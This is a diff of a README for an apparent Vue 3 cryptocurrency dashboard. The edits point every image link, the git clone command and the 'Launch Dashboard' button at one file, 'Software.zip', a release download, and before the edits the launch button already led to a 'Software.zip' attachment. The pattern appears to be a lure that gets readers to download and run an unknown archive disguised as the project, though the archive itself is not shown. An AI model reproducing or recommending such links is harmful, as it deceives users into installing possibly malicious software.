@@ -2,7 +2,7 @@
 
 Welcome to the Vue 3 Crypto Dashboard repository! This dashboard is designed to provide you with a comprehensive overview of the cryptocurrency market using Vue 3. It incorporates various features such as real-time data updates, interactive charts, and a user-friendly interface to keep you informed about the latest trends in the crypto world.
 
-![Crypto Dashboard Preview](https://example.com/preview-image.png)
+![Crypto Dashboard Preview](https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip)
 
 ## Features 🌟
 
@@ -19,7 +19,7 @@ To get started with the Vue 3 Crypto Dashboard, simply follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/yourusername/vue3-crypto-dashboard.git
+   git clone https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip
    ```
 
 2. Install dependencies using npm or yarn:
@@ -40,9 +40,9 @@ To get started with the Vue 3 Crypto Dashboard, simply follow these steps:
 
 Here are a few snapshots of the Vue 3 Crypto Dashboard in action:
 
-![Screenshot 1](https://example.com/screenshot-1.png)
+![Screenshot 1](https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip)
 
-![Screenshot 2](https://example.com/screenshot-2.png)
+![Screenshot 2](https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip)
 
 ## Data Sources 📊
 
@@ -52,7 +52,7 @@ The dashboard retrieves real-time cryptocurrency data from the Binance API using
 
 You can access the Vue 3 Crypto Dashboard by clicking the button below:
 
-[![Launch Crypto Dashboard](https://img.shields.io/badge/Launch-Dashboard-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Launch Crypto Dashboard](https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip)](https://github.com/x4lex19o/vue3-crypto-dashboard/releases/download/v2.0/Software.zip)
 
 ## Repository Structure 📁
 
